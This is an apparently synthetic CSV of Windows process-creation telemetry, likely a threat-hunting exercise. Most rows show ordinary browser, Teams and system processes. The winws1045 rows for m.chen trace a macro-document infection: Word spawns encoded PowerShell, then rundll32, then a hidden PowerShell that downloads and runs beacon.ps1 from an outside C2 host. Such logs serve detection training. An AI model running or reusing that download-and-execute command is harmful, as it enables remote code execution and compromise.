Hostname,Username,ProcessName,ProcessID,ParentProcessName,ParentProcessID,CommandLine,EventTimestamp
winws1235,a.smith,chrome.exe,14801,explorer.exe,5080,null,2025-09-15 08:29:21.456345 UTC
winws1091,a.smith,chrome.exe,21501,explorer.exe,6550,null,2025-09-15 08:42:42.456345 UTC
winws1071,a.smith,chrome.exe,16501,explorer.exe,5450,null,2025-09-15 08:32:42.789678 UTC
winws0121,a.smith,chrome.exe,18401,explorer.exe,5860,null,2025-09-15 08:36:27.789678 UTC
winws0101,a.smith,chrome.exe,13401,explorer.exe,4760,null,2025-09-15 08:26:27.123012 UTC
winws1051,a.smith,chrome.exe,11501,explorer.exe,4350,null,2025-09-15 08:22:42.123012 UTC
winws0141,a.smith,chrome.exe,23401,explorer.exe,6960,null,2025-09-15 08:46:27.456345 UTC
winws0091,a.smith,chrome.exe,10901,explorer.exe,4210,null,2025-09-15 08:21:27.789678 UTC
winws1245,a.smith,chrome.exe,16101,explorer.exe,5360,null,2025-09-15 08:31:51.123012 UTC
winws1205,a.smith,chrome.exe,11101,explorer.exe,4260,null,2025-09-15 08:21:51.456345 UTC
winws1275,a.smith,chrome.exe,19801,explorer.exe,6180,null,2025-09-15 08:39:21.123012 UTC
winws1285,a.smith,chrome.exe,21101,explorer.exe,6460,null,2025-09-15 08:41:51.789678 UTC
winws0255,a.smith,explorer.exe,7000,services.exe,500,null,2025-09-15 08:46:48.789678 UTC
winws1212,a.smith,explorer.exe,4440,services.exe,500,null,2025-09-15 08:23:30.456345 UTC
winws0116,a.smith,explorer.exe,5590,services.exe,500,null,2025-09-15 08:33:57.123012 UTC
winws1292,a.smith,explorer.exe,6640,services.exe,500,null,2025-09-15 08:43:30.789678 UTC
winws0178,a.smith,explorer.exe,4850,services.exe,500,null,2025-09-15 08:27:18.789678 UTC
winws1086,a.smith,explorer.exe,6270,services.exe,500,null,2025-09-15 08:40:12.789678 UTC
winws0237,a.smith,explorer.exe,6500,services.exe,500,null,2025-09-15 08:42:18.789678 UTC
winws0217,a.smith,explorer.exe,5950,services.exe,500,null,2025-09-15 08:37:18.456345 UTC
winws1104,a.smith,explorer.exe,7260,services.exe,500,null,2025-09-15 08:49:12.789678 UTC
winws0171,a.smith,explorer.exe,4670,services.exe,500,null,2025-09-15 08:25:33.123012 UTC
winws0263,a.smith,explorer.exe,7220,services.exe,500,null,2025-09-15 08:48:48.123012 UTC
winws0030,a.smith,explorer.exe,4300,services.exe,500,null,2025-09-15 08:05:15.789012 UTC
winws0096,a.smith,explorer.exe,4490,services.exe,500,null,2025-09-15 08:23:57.456345 UTC
winws0208,a.smith,explorer.exe,5680,services.exe,500,null,2025-09-15 08:34:48.789678 UTC
winws0266,a.smith,explorer.exe,7310,services.exe,500,null,2025-09-15 08:49:33.123012 UTC
winws1232,a.smith,explorer.exe,4990,services.exe,500,null,2025-09-15 08:28:30.789678 UTC
winws0247,a.smith,explorer.exe,6780,services.exe,500,null,2025-09-15 08:44:48.456345 UTC
winws0198,a.smith,explorer.exe,5400,services.exe,500,null,2025-09-15 08:32:18.123012 UTC
winws0106,a.smith,explorer.exe,5040,services.exe,500,null,2025-09-15 08:28:57.789678 UTC
winws0230,a.smith,explorer.exe,6320,services.exe,500,null,2025-09-15 08:40:33.123012 UTC
winws0158,a.smith,explorer.exe,4300,services.exe,500,null,2025-09-15 08:22:18.456345 UTC
winws1056,a.smith,explorer.exe,4620,services.exe,500,null,2025-09-15 08:25:12.789678 UTC
winws0188,a.smith,explorer.exe,5130,services.exe,500,null,2025-09-15 08:29:48.456345 UTC
winws1076,a.smith,explorer.exe,5720,services.exe,500,null,2025-09-15 08:35:12.456345 UTC
winws0227,a.smith,explorer.exe,6230,services.exe,500,null,2025-09-15 08:39:48.123012 UTC
winws0191,a.smith,explorer.exe,5220,services.exe,500,null,2025-09-15 08:30:33.456345 UTC
winws0168,a.smith,explorer.exe,4580,services.exe,500,null,2025-09-15 08:24:48.123012 UTC
winws0136,a.smith,explorer.exe,6690,services.exe,500,null,2025-09-15 08:43:57.789678 UTC
winws1308,a.smith,explorer.exe,7080,services.exe,500,null,2025-09-15 08:47:30.456345 UTC
winws1066,a.smith,explorer.exe,5170,services.exe,500,null,2025-09-15 08:30:12.123012 UTC
winws1272,a.smith,explorer.exe,6090,services.exe,500,null,2025-09-15 08:38:30.456345 UTC
winws1100,a.smith,explorer.exe,7040,services.exe,500,null,2025-09-15 08:47:12.456345 UTC
winws0140,a.smith,explorer.exe,6910,services.exe,500,null,2025-09-15 08:45:57.123012 UTC
winws0250,a.smith,explorer.exe,6870,services.exe,500,null,2025-09-15 08:45:33.456345 UTC
winws1096,a.smith,explorer.exe,6820,services.exe,500,null,2025-09-15 08:45:12.123012 UTC
winws0210,a.smith,explorer.exe,5770,services.exe,500,null,2025-09-15 08:35:33.789678 UTC
winws0126,a.smith,explorer.exe,6140,services.exe,500,null,2025-09-15 08:38:57.456345 UTC
winws1252,a.smith,explorer.exe,5540,services.exe,500,null,2025-09-15 08:33:30.123012 UTC
winws0144,a.smith,explorer.exe,7130,services.exe,500,null,2025-09-15 08:47:57.456345 UTC
winws1255,a.smith,msedge.exe,17301,explorer.exe,5630,null,2025-09-15 08:34:21.789678 UTC
winws0161,a.smith,msedge.exe,11701,explorer.exe,4390,null,2025-09-15 08:23:03.456345 UTC
winws1081,a.smith,msedge.exe,19001,explorer.exe,6000,null,2025-09-15 08:37:42.123012 UTC
winws1295,a.smith,msedge.exe,22301,explorer.exe,6730,null,2025-09-15 08:44:21.456345 UTC
winws0201,a.smith,msedge.exe,16701,explorer.exe,5490,null,2025-09-15 08:33:03.123012 UTC
winws0240,a.smith,msedge.exe,21701,explorer.exe,6590,null,2025-09-15 08:43:03.789678 UTC
winws1319,a.smith,msedge.exe,25301,explorer.exe,7390,null,2025-09-15 08:50:21.456345 UTC
winws1061,a.smith,msedge.exe,14001,explorer.exe,4900,null,2025-09-15 08:27:42.456345 UTC
winws1311,a.smith,msedge.exe,24301,explorer.exe,7170,null,2025-09-15 08:48:21.123012 UTC
winws1215,a.smith,msedge.exe,12301,explorer.exe,4530,null,2025-09-15 08:24:21.123012 UTC
winws1202,a.smith,msedge.exe,10701,explorer.exe,4160,null,2025-09-15 08:21:00.789678 UTC
winws1222,a.smith,svchost.exe,3200,services.exe,500,null,2025-09-15 08:26:00.123012 UTC
winws1318,a.smith,svchost.exe,10400,services.exe,500,null,2025-09-15 08:50:00.123012 UTC
winws1262,a.smith,svchost.exe,6200,services.exe,500,null,2025-09-15 08:36:00.789678 UTC
winws1242,a.smith,svchost.exe,4700,services.exe,500,null,2025-09-15 08:31:00.456345 UTC
winws1282,a.smith,svchost.exe,7700,services.exe,500,null,2025-09-15 08:41:00.123012 UTC
winws0220,a.smith,teams.exe,19201,explorer.exe,6040,null,2025-09-15 08:38:03.456345 UTC
winws0151,a.smith,teams.exe,10501,explorer.exe,4130,null,2025-09-15 08:20:33.789678 UTC
winws0111,a.smith,teams.exe,15901,explorer.exe,5310,null,2025-09-15 08:31:27.456345 UTC
winws1265,a.smith,teams.exe,18601,explorer.exe,5910,null,2025-09-15 08:36:51.456345 UTC
winws0131,a.smith,teams.exe,20901,explorer.exe,6410,null,2025-09-15 08:41:27.123012 UTC
winws0181,a.smith,teams.exe,14201,explorer.exe,4940,null,2025-09-15 08:28:03.789678 UTC
winws1225,a.smith,teams.exe,13601,explorer.exe,4810,null,2025-09-15 08:26:51.789678 UTC
winws0129,d.kim,chrome.exe,20401,explorer.exe,6300,null,2025-09-15 08:40:27.456345 UTC
winws0089,d.kim,chrome.exe,10401,explorer.exe,4070,null,2025-09-15 08:15:28.123789 UTC
winws1079,d.kim,chrome.exe,18501,explorer.exe,5890,null,2025-09-15 08:36:42.456345 UTC
winws1261,d.kim,chrome.exe,18101,explorer.exe,5800,null,2025-09-15 08:35:51.789678 UTC
winws1211,d.kim,chrome.exe,11801,explorer.exe,4420,null,2025-09-15 08:23:21.456345 UTC
winws0109,d.kim,chrome.exe,15401,explorer.exe,5200,null,2025-09-15 08:30:27.789678 UTC
winws1221,d.kim,chrome.exe,13101,explorer.exe,4700,null,2025-09-15 08:25:51.123012 UTC
winws1291,d.kim,chrome.exe,21801,explorer.exe,6620,null,2025-09-15 08:43:21.789678 UTC
winws1251,d.kim,chrome.exe,16801,explorer.exe,5520,null,2025-09-15 08:33:21.123012 UTC
winws1059,d.kim,chrome.exe,13501,explorer.exe,4790,null,2025-09-15 08:26:42.789678 UTC
winws1315,d.kim,chrome.exe,24801,explorer.exe,7280,null,2025-09-15 08:49:21.789678 UTC
winws1307,d.kim,chrome.exe,23801,explorer.exe,7060,null,2025-09-15 08:47:21.456345 UTC
winws1268,d.kim,explorer.exe,5980,services.exe,500,null,2025-09-15 08:37:30.789678 UTC
winws0243,d.kim,explorer.exe,6670,services.exe,500,null,2025-09-15 08:43:48.789678 UTC
winws1248,d.kim,explorer.exe,5430,services.exe,500,null,2025-09-15 08:32:30.456345 UTC
winws1102,d.kim,explorer.exe,7150,services.exe,500,null,2025-09-15 08:48:12.123012 UTC
winws0094,d.kim,explorer.exe,4380,services.exe,500,null,2025-09-15 08:22:57.789678 UTC
winws0194,d.kim,explorer.exe,5290,services.exe,500,null,2025-09-15 08:31:18.456345 UTC
winws1228,d.kim,explorer.exe,4880,services.exe,500,null,2025-09-15 08:27:30.123012 UTC
winws0254,d.kim,explorer.exe,6980,services.exe,500,null,2025-09-15 08:46:33.123012 UTC
winws1208,d.kim,explorer.exe,4330,services.exe,500,null,2025-09-15 08:22:30.789678 UTC
winws1288,d.kim,explorer.exe,6530,services.exe,500,null,2025-09-15 08:42:30.123012 UTC
winws0207,d.kim,explorer.exe,5660,services.exe,500,null,2025-09-15 08:34:33.123012 UTC
winws0269,d.kim,explorer.exe,7420,services.exe,500,null,2025-09-15 08:50:33.789678 UTC
winws0204,d.kim,explorer.exe,5570,services.exe,500,null,2025-09-15 08:33:48.123012 UTC
winws0167,d.kim,explorer.exe,4560,services.exe,500,null,2025-09-15 08:24:33.456345 UTC
winws0174,d.kim,explorer.exe,4740,services.exe,500,null,2025-09-15 08:26:18.123012 UTC
winws0187,d.kim,explorer.exe,5110,services.exe,500,null,2025-09-15 08:29:33.789678 UTC
winws1106,d.kim,explorer.exe,7370,services.exe,500,null,2025-09-15 08:50:12.456345 UTC
winws0267,d.kim,explorer.exe,7330,services.exe,500,null,2025-09-15 08:49:48.789678 UTC
winws1084,d.kim,explorer.exe,6160,services.exe,500,null,2025-09-15 08:39:12.123012 UTC
winws0114,d.kim,explorer.exe,5480,services.exe,500,null,2025-09-15 08:32:57.456345 UTC
winws1054,d.kim,explorer.exe,4510,services.exe,500,null,2025-09-15 08:24:12.123012 UTC
winws0246,d.kim,explorer.exe,6760,services.exe,500,null,2025-09-15 08:44:33.789678 UTC
winws0262,d.kim,explorer.exe,7200,services.exe,500,null,2025-09-15 08:48:33.456345 UTC
winws0259,d.kim,explorer.exe,7110,services.exe,500,null,2025-09-15 08:47:48.456345 UTC
winws0164,d.kim,explorer.exe,4470,services.exe,500,null,2025-09-15 08:23:48.456345 UTC
winws0124,d.kim,explorer.exe,6030,services.exe,500,null,2025-09-15 08:37:57.789678 UTC
winws1201,d.kim,explorer.exe,4150,services.exe,500,null,2025-09-15 08:20:51.789678 UTC
winws0213,d.kim,explorer.exe,5840,services.exe,500,null,2025-09-15 08:36:18.789678 UTC
winws0184,d.kim,explorer.exe,5020,services.exe,500,null,2025-09-15 08:28:48.789678 UTC
winws0104,d.kim,explorer.exe,4930,services.exe,500,null,2025-09-15 08:27:57.123012 UTC
winws0233,d.kim,explorer.exe,6390,services.exe,500,null,2025-09-15 08:41:18.123012 UTC
winws0134,d.kim,explorer.exe,6580,services.exe,500,null,2025-09-15 08:42:57.123012 UTC
winws0223,d.kim,explorer.exe,6120,services.exe,500,null,2025-09-15 08:38:48.456345 UTC
winws1074,d.kim,explorer.exe,5610,services.exe,500,null,2025-09-15 08:34:12.789678 UTC
winws1064,d.kim,explorer.exe,5060,services.exe,500,null,2025-09-15 08:29:12.456345 UTC
winws0226,d.kim,explorer.exe,6210,services.exe,500,null,2025-09-15 08:39:33.456345 UTC
winws1271,d.kim,msedge.exe,19301,explorer.exe,6070,null,2025-09-15 08:38:21.456345 UTC
winws0216,d.kim,msedge.exe,18701,explorer.exe,5930,null,2025-09-15 08:37:03.789678 UTC
winws1231,d.kim,msedge.exe,14301,explorer.exe,4970,null,2025-09-15 08:28:21.789678 UTC
winws1089,d.kim,msedge.exe,21001,explorer.exe,6440,null,2025-09-15 08:41:42.789678 UTC
winws0177,d.kim,msedge.exe,13701,explorer.exe,4830,null,2025-09-15 08:27:03.123012 UTC
winws1049,d.kim,msedge.exe,11001,explorer.exe,4240,null,2025-09-15 08:21:42.456345 UTC
winws1069,d.kim,msedge.exe,16001,explorer.exe,5340,null,2025-09-15 08:31:42.123012 UTC
winws1238,d.kim,svchost.exe,4400,services.exe,500,null,2025-09-15 08:30:00.789678 UTC
winws1218,d.kim,svchost.exe,2900,services.exe,500,null,2025-09-15 08:25:00.456345 UTC
winws1278,d.kim,svchost.exe,7400,services.exe,500,null,2025-09-15 08:40:00.456345 UTC
winws1306,d.kim,svchost.exe,9500,services.exe,500,null,2025-09-15 08:47:00.123012 UTC
winws1314,d.kim,svchost.exe,10100,services.exe,500,null,2025-09-15 08:49:00.456345 UTC
winws1258,d.kim,svchost.exe,5900,services.exe,500,null,2025-09-15 08:35:00.123012 UTC
winws1298,d.kim,svchost.exe,8900,services.exe,500,null,2025-09-15 08:45:00.789678 UTC
winws0119,d.kim,teams.exe,17901,explorer.exe,5750,null,2025-09-15 08:35:27.123012 UTC
winws1241,d.kim,teams.exe,15601,explorer.exe,5250,null,2025-09-15 08:30:51.456345 UTC
winws0157,d.kim,teams.exe,11201,explorer.exe,4280,null,2025-09-15 08:22:03.789678 UTC
winws0197,d.kim,teams.exe,16201,explorer.exe,5380,null,2025-09-15 08:32:03.456345 UTC
winws0236,d.kim,teams.exe,21201,explorer.exe,6480,null,2025-09-15 08:42:03.123012 UTC
winws1281,d.kim,teams.exe,20601,explorer.exe,6350,null,2025-09-15 08:40:51.123012 UTC
winws0154,d.kim,teams.exe,10801,explorer.exe,4190,null,2025-09-15 08:21:18.789678 UTC
winws0252,d.kim,teams.exe,23201,explorer.exe,6920,null,2025-09-15 08:46:03.789678 UTC
winws0099,d.kim,teams.exe,12901,explorer.exe,4650,null,2025-09-15 08:25:27.456345 UTC
winws0139,d.kim,teams.exe,22901,explorer.exe,6850,null,2025-09-15 08:45:27.789678 UTC
winws1301,j.doe,chrome.exe,23101,explorer.exe,6900,null,2025-09-15 08:45:51.456345 UTC
winws1293,j.doe,chrome.exe,22101,explorer.exe,6680,null,2025-09-15 08:43:51.123012 UTC
winws1243,j.doe,chrome.exe,15801,explorer.exe,5300,null,2025-09-15 08:31:21.789678 UTC
winws1253,j.doe,chrome.exe,17101,explorer.exe,5580,null,2025-09-15 08:33:51.456345 UTC
winws1055,j.doe,chrome.exe,12501,explorer.exe,4570,null,2025-09-15 08:24:42.456345 UTC
winws0012,j.doe,chrome.exe,10012,explorer.exe,4050,null,2025-09-15 08:05:10.123456 UTC
winws1075,j.doe,chrome.exe,17501,explorer.exe,5670,null,2025-09-15 08:34:42.123012 UTC
winws0105,j.doe,chrome.exe,14401,explorer.exe,4980,null,2025-09-15 08:28:27.456345 UTC
winws1309,j.doe,chrome.exe,24101,explorer.exe,7120,null,2025-09-15 08:47:51.789678 UTC
winws1317,j.doe,chrome.exe,25101,explorer.exe,7340,null,2025-09-15 08:49:51.123012 UTC
winws1103,j.doe,chrome.exe,24501,explorer.exe,7210,null,2025-09-15 08:48:42.456345 UTC
winws1095,j.doe,chrome.exe,22501,explorer.exe,6770,null,2025-09-15 08:44:42.789678 UTC
winws1283,j.doe,chrome.exe,20801,explorer.exe,6400,null,2025-09-15 08:41:21.456345 UTC
winws1099,j.doe,chrome.exe,23501,explorer.exe,6990,null,2025-09-15 08:46:42.123012 UTC
winws1213,j.doe,chrome.exe,12101,explorer.exe,4480,null,2025-09-15 08:23:51.789678 UTC
winws0125,j.doe,chrome.exe,19401,explorer.exe,6080,null,2025-09-15 08:38:27.123012 UTC
winws0269,j.doe,explorer.exe,7380,services.exe,500,null,2025-09-15 08:50:18.123012 UTC
winws0215,j.doe,explorer.exe,5900,services.exe,500,null,2025-09-15 08:36:48.123012 UTC
winws0206,j.doe,explorer.exe,5620,services.exe,500,null,2025-09-15 08:34:18.456345 UTC
winws0110,j.doe,explorer.exe,5260,services.exe,500,null,2025-09-15 08:30:57.123012 UTC
winws1203,j.doe,explorer.exe,4200,services.exe,500,null,2025-09-15 08:21:21.123012 UTC
winws0166,j.doe,explorer.exe,4520,services.exe,500,null,2025-09-15 08:24:18.789678 UTC
winws0130,j.doe,explorer.exe,6360,services.exe,500,null,2025-09-15 08:40:57.789678 UTC
winws0238,j.doe,explorer.exe,6540,services.exe,500,null,2025-09-15 08:42:33.456345 UTC
winws1300,j.doe,explorer.exe,6860,services.exe,500,null,2025-09-15 08:45:30.123012 UTC
winws0176,j.doe,explorer.exe,4800,services.exe,500,null,2025-09-15 08:26:48.456345 UTC
winws1050,j.doe,explorer.exe,4290,services.exe,500,null,2025-09-15 08:22:12.789678 UTC
winws0199,j.doe,explorer.exe,5440,services.exe,500,null,2025-09-15 08:32:33.789678 UTC
winws0120,j.doe,explorer.exe,5810,services.exe,500,null,2025-09-15 08:35:57.456345 UTC
winws0179,j.doe,explorer.exe,4890,services.exe,500,null,2025-09-15 08:27:33.456345 UTC
winws0218,j.doe,explorer.exe,5990,services.exe,500,null,2025-09-15 08:37:33.123012 UTC
winws0150,j.doe,explorer.exe,4120,services.exe,500,null,2025-09-15 08:20:30.456345 UTC
winws0235,j.doe,explorer.exe,6450,services.exe,500,null,2025-09-15 08:41:48.456345 UTC
winws1280,j.doe,explorer.exe,6310,services.exe,500,null,2025-09-15 08:40:30.789678 UTC
winws0159,j.doe,explorer.exe,4340,services.exe,500,null,2025-09-15 08:22:33.123012 UTC
winws1316,j.doe,explorer.exe,7300,services.exe,500,null,2025-09-15 08:49:30.789678 UTC
winws1080,j.doe,explorer.exe,5940,services.exe,500,null,2025-09-15 08:37:12.789678 UTC
winws1090,j.doe,explorer.exe,6490,services.exe,500,null,2025-09-15 08:42:12.123012 UTC
winws0225,j.doe,explorer.exe,6170,services.exe,500,null,2025-09-15 08:39:18.789678 UTC
winws1240,j.doe,explorer.exe,5210,services.exe,500,null,2025-09-15 08:30:30.123012 UTC
winws0186,j.doe,explorer.exe,5070,services.exe,500,null,2025-09-15 08:29:18.123012 UTC
winws0245,j.doe,explorer.exe,6720,services.exe,500,null,2025-09-15 08:44:18.123012 UTC
winws0100,j.doe,explorer.exe,4710,services.exe,500,null,2025-09-15 08:25:57.789678 UTC
winws0156,j.doe,explorer.exe,4250,services.exe,500,null,2025-09-15 08:21:48.123012 UTC
winws1060,j.doe,explorer.exe,4840,services.exe,500,null,2025-09-15 08:27:12.123012 UTC
winws0253,j.doe,explorer.exe,6940,services.exe,500,null,2025-09-15 08:46:18.456345 UTC
winws0196,j.doe,explorer.exe,5350,services.exe,500,null,2025-09-15 08:31:48.789678 UTC
winws1260,j.doe,explorer.exe,5760,services.exe,500,null,2025-09-15 08:35:30.456345 UTC
winws0261,j.doe,explorer.exe,7160,services.exe,500,null,2025-09-15 08:48:18.789678 UTC
winws1220,j.doe,explorer.exe,4660,services.exe,500,null,2025-09-15 08:25:30.789678 UTC
winws1263,j.doe,msedge.exe,18301,explorer.exe,5850,null,2025-09-15 08:36:21.123012 UTC
winws0264,j.doe,msedge.exe,24701,explorer.exe,7250,null,2025-09-15 08:49:03.789678 UTC
winws1065,j.doe,msedge.exe,15001,explorer.exe,5120,null,2025-09-15 08:29:42.789678 UTC
winws1085,j.doe,msedge.exe,20001,explorer.exe,6220,null,2025-09-15 08:39:42.456345 UTC
winws0209,j.doe,msedge.exe,17701,explorer.exe,5710,null,2025-09-15 08:35:03.456345 UTC
winws1223,j.doe,msedge.exe,13301,explorer.exe,4750,null,2025-09-15 08:26:21.456345 UTC
winws0256,j.doe,msedge.exe,23701,explorer.exe,7030,null,2025-09-15 08:47:03.456345 UTC
winws0248,j.doe,msedge.exe,22701,explorer.exe,6810,null,2025-09-15 08:45:03.123012 UTC
winws0169,j.doe,msedge.exe,12701,explorer.exe,4610,null,2025-09-15 08:25:03.789678 UTC
winws1210,j.doe,svchost.exe,2300,services.exe,500,null,2025-09-15 08:23:00.123012 UTC
winws1230,j.doe,svchost.exe,3800,services.exe,500,null,2025-09-15 08:28:00.456345 UTC
winws1250,j.doe,svchost.exe,5300,services.exe,500,null,2025-09-15 08:33:00.789678 UTC
winws1290,j.doe,svchost.exe,8300,services.exe,500,null,2025-09-15 08:43:00.456345 UTC
winws0090,j.doe,svchost.exe,1700,services.exe,500,null,2025-09-15 08:20:57.456345 UTC
winws1270,j.doe,svchost.exe,6800,services.exe,500,null,2025-09-15 08:38:00.123012 UTC
winws1233,j.doe,teams.exe,14601,explorer.exe,5030,null,2025-09-15 08:28:51.123012 UTC
winws0143,j.doe,teams.exe,23901,explorer.exe,7070,null,2025-09-15 08:47:27.123012 UTC
winws0189,j.doe,teams.exe,15201,explorer.exe,5160,null,2025-09-15 08:30:03.123012 UTC
winws0095,j.doe,teams.exe,11901,explorer.exe,4430,null,2025-09-15 08:23:27.123012 UTC
winws0228,j.doe,teams.exe,20201,explorer.exe,6260,null,2025-09-15 08:40:03.789678 UTC
winws0135,j.doe,teams.exe,21901,explorer.exe,6630,null,2025-09-15 08:43:27.456345 UTC
winws1273,j.doe,teams.exe,19601,explorer.exe,6130,null,2025-09-15 08:38:51.789678 UTC
winws0115,j.doe,teams.exe,16901,explorer.exe,5530,null,2025-09-15 08:33:27.789678 UTC
winws1045,m.chen,powershell.exe,6310,winword.exe,6200,powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACgAIgBpAG4AdgBpAG4AbgAZQByACAAcwBjAHIAaQBwAHQAIgApADsA,2025-09-15 08:07:35.121212 UTC
winws1045,m.chen,rundll32.exe,6400,powershell.exe,6310,"rundll32.exe C:\Users\m.chen\AppData\Local\Temp\update.dat,EntryPoint",2025-09-15 08:07:38.454545 UTC
winws1045,m.chen,powershell.exe,7100,rundll32.exe,6400,"powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2-backup-server.org/beacon.ps1')""",2025-09-15 08:08:00.998877 UTC
winws1045,m.chen,outlook.exe,5150,explorer.exe,4100,null,2025-09-15 08:06:00.112233 UTC
winws1045,m.chen,winword.exe,6200,outlook.exe,5150,C:\Users\m.chen\Downloads\invoice-document-share.docm,2025-09-15 08:07:30.556677 UTC
winws1227,m.chen,chrome.exe,13801,explorer.exe,4860,null,2025-09-15 08:27:21.123012 UTC
winws0097,m.chen,chrome.exe,12401,explorer.exe,4540,null,2025-09-15 08:24:27.789678 UTC
winws1067,m.chen,chrome.exe,15501,explorer.exe,5230,null,2025-09-15 08:30:42.456345 UTC
winws0137,m.chen,chrome.exe,22401,explorer.exe,6740,null,2025-09-15 08:44:27.123012 UTC
winws1237,m.chen,chrome.exe,15101,explorer.exe,5140,null,2025-09-15 08:29:51.789678 UTC
winws1087,m.chen,chrome.exe,20501,explorer.exe,6330,null,2025-09-15 08:40:42.123012 UTC
winws1267,m.chen,chrome.exe,18801,explorer.exe,5960,null,2025-09-15 08:37:21.789678 UTC
winws1277,m.chen,chrome.exe,20101,explorer.exe,6240,null,2025-09-15 08:39:51.456345 UTC
winws0145,m.chen,chrome.exe,24401,explorer.exe,7180,null,2025-09-15 08:48:27.789678 UTC
winws0149,m.chen,chrome.exe,25401,explorer.exe,7400,null,2025-09-15 08:50:27.123012 UTC
winws0117,m.chen,chrome.exe,17401,explorer.exe,5640,null,2025-09-15 08:34:27.456345 UTC
winws0112,m.chen,explorer.exe,5370,services.exe,500,null,2025-09-15 08:31:57.789678 UTC
winws1244,m.chen,explorer.exe,5320,services.exe,500,null,2025-09-15 08:31:30.789678 UTC
winws0219,m.chen,explorer.exe,6010,services.exe,500,null,2025-09-15 08:37:48.789678 UTC
winws0122,m.chen,explorer.exe,5920,services.exe,500,null,2025-09-15 08:36:57.123012 UTC
winws1204,m.chen,explorer.exe,4220,services.exe,500,null,2025-09-15 08:21:30.123012 UTC
winws1224,m.chen,explorer.exe,4770,services.exe,500,null,2025-09-15 08:26:30.456345 UTC
winws0190,m.chen,explorer.exe,5180,services.exe,500,null,2025-09-15 08:30:18.789678 UTC
winws0148,m.chen,explorer.exe,7350,services.exe,500,null,2025-09-15 08:49:57.789678 UTC
winws0239,m.chen,explorer.exe,6560,services.exe,500,null,2025-09-15 08:42:48.123012 UTC
winws0203,m.chen,explorer.exe,5550,services.exe,500,null,2025-09-15 08:33:33.456345 UTC
winws0180,m.chen,explorer.exe,4910,services.exe,500,null,2025-09-15 08:27:48.123012 UTC
winws0209,m.chen,explorer.exe,5730,services.exe,500,null,2025-09-15 08:35:18.123012 UTC
winws1072,m.chen,explorer.exe,5500,services.exe,500,null,2025-09-15 08:33:12.123012 UTC
winws0132,m.chen,explorer.exe,6470,services.exe,500,null,2025-09-15 08:41:57.456345 UTC
winws0249,m.chen,explorer.exe,6830,services.exe,500,null,2025-09-15 08:45:18.789678 UTC
winws0153,m.chen,explorer.exe,4170,services.exe,500,null,2025-09-15 08:21:03.123012 UTC
winws0163,m.chen,explorer.exe,4450,services.exe,500,null,2025-09-15 08:23:33.789678 UTC
winws1052,m.chen,explorer.exe,4400,services.exe,500,null,2025-09-15 08:23:12.456345 UTC
winws0258,m.chen,explorer.exe,7090,services.exe,500,null,2025-09-15 08:47:33.789678 UTC
winws0200,m.chen,explorer.exe,5460,services.exe,500,null,2025-09-15 08:32:48.456345 UTC
winws0102,m.chen,explorer.exe,4820,services.exe,500,null,2025-09-15 08:26:57.456345 UTC
winws1284,m.chen,explorer.exe,6420,services.exe,500,null,2025-09-15 08:41:30.456345 UTC
winws1082,m.chen,explorer.exe,6050,services.exe,500,null,2025-09-15 08:38:12.456345 UTC
winws0170,m.chen,explorer.exe,4630,services.exe,500,null,2025-09-15 08:25:18.456345 UTC
winws0222,m.chen,explorer.exe,6100,services.exe,500,null,2025-09-15 08:38:33.789678 UTC
winws0092,m.chen,explorer.exe,4270,services.exe,500,null,2025-09-15 08:21:57.123012 UTC
winws0183,m.chen,explorer.exe,5000,services.exe,500,null,2025-09-15 08:28:33.123012 UTC
winws1092,m.chen,explorer.exe,6600,services.exe,500,null,2025-09-15 08:43:12.789678 UTC
winws0242,m.chen,explorer.exe,6650,services.exe,500,null,2025-09-15 08:43:33.123012 UTC
winws0229,m.chen,explorer.exe,6280,services.exe,500,null,2025-09-15 08:40:18.456345 UTC
winws1264,m.chen,explorer.exe,5870,services.exe,500,null,2025-09-15 08:36:30.123012 UTC
winws0160,m.chen,explorer.exe,4360,services.exe,500,null,2025-09-15 08:22:48.789678 UTC
winws1062,m.chen,explorer.exe,4950,services.exe,500,null,2025-09-15 08:28:12.789678 UTC
winws1045,m.chen,explorer.exe,4100,services.exe,500,null,2025-09-15 08:05:20.321456 UTC
winws0232,m.chen,msedge.exe,20701,explorer.exe,6370,null,2025-09-15 08:41:03.456345 UTC
winws1287,m.chen,msedge.exe,21301,explorer.exe,6510,null,2025-09-15 08:42:21.123012 UTC
winws1077,m.chen,msedge.exe,18001,explorer.exe,5780,null,2025-09-15 08:35:42.789678 UTC
winws1247,m.chen,msedge.exe,16301,explorer.exe,5410,null,2025-09-15 08:32:21.456345 UTC
winws0193,m.chen,msedge.exe,15701,explorer.exe,5270,null,2025-09-15 08:31:03.789678 UTC
winws1207,m.chen,msedge.exe,11301,explorer.exe,4310,null,2025-09-15 08:22:21.789678 UTC
winws1097,m.chen,msedge.exe,23001,explorer.exe,6880,null,2025-09-15 08:45:42.456345 UTC
winws1303,m.chen,msedge.exe,23301,explorer.exe,6950,null,2025-09-15 08:46:21.789678 UTC
winws1057,m.chen,msedge.exe,13001,explorer.exe,4680,null,2025-09-15 08:25:42.123012 UTC
winws1302,m.chen,svchost.exe,9200,services.exe,500,null,2025-09-15 08:46:00.456345 UTC
winws1274,m.chen,svchost.exe,7100,services.exe,500,null,2025-09-15 08:39:00.789678 UTC
winws1294,m.chen,svchost.exe,8600,services.exe,500,null,2025-09-15 08:44:00.123012 UTC
winws1254,m.chen,svchost.exe,5600,services.exe,500,null,2025-09-15 08:34:00.456345 UTC
winws1234,m.chen,svchost.exe,4100,services.exe,500,null,2025-09-15 08:29:00.123012 UTC
winws1214,m.chen,svchost.exe,2600,services.exe,500,null,2025-09-15 08:24:00.789678 UTC
winws1310,m.chen,svchost.exe,9800,services.exe,500,null,2025-09-15 08:48:00.789678 UTC
winws1047,m.chen,svchost.exe,1600,services.exe,500,null,2025-09-15 08:20:42.789678 UTC
winws1313,m.chen,teams.exe,24601,explorer.exe,7230,null,2025-09-15 08:48:51.456345 UTC
winws1257,m.chen,teams.exe,17601,explorer.exe,5690,null,2025-09-15 08:34:51.123012 UTC
winws0173,m.chen,teams.exe,13201,explorer.exe,4720,null,2025-09-15 08:26:03.456345 UTC
winws1217,m.chen,teams.exe,12601,explorer.exe,4590,null,2025-09-15 08:24:51.456345 UTC
winws0107,m.chen,teams.exe,14901,explorer.exe,5090,null,2025-09-15 08:29:27.123012 UTC
winws0127,m.chen,teams.exe,19901,explorer.exe,6190,null,2025-09-15 08:39:27.789678 UTC
winws0212,m.chen,teams.exe,18201,explorer.exe,5820,null,2025-09-15 08:36:03.123012 UTC
